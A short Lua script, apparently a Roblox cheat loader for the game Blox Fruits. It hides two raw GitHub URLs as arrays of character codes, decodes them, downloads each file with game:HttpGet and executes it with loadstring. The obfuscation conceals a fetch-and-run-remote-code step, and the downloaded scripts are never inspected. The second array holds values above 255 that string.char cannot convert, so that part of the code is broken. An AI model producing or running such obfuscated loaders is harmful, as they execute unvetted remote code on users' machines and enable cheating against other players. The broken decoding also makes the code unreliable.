local a = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 114, 101, 97, 108, 114, 101, 100, 122, 47, 66, 108, 111, 120, 70, 114, 117, 105, 116, 115, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 83, 111, 117, 114, 99, 101, 46, 108, 117, 97}
local b = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 107, 104, 111, 105, 116, 111, 110, 103, 100, 122, 47, 75, 101, 110, 111, 110, 45, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 97, 117, 116, 111, 32, 114, 431, 417, 110, 103, 46, 108, 117, 97}

local function decode(tbl)
    local str = ""
    for i = 1, #tbl do
        str = str .. string.char(tbl[i])
    end
    return str
end

local urls = {decode(a), decode(b)}

for i = 1, #urls do
    local content = game:HttpGet(urls[i])
    loadstring(content)()
end
